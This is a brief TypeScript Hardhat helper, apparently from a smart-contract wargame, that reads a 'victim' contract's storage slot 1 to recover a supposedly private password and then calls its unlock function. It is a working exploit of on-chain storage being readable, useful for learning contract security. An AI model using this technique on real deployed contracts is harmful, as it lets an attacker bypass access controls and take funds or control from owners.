import { expect } from "chai";
import { ethers, waffle, web3 } from "hardhat"; // TODO: note sure if web3 is not needed or something

const helper = async (victim: any) => {
  let password;
  await web3.eth.getStorageAt(victim.address, 1, (_, p) => password = p)
  await victim.unlock(password);
};

export default helper;
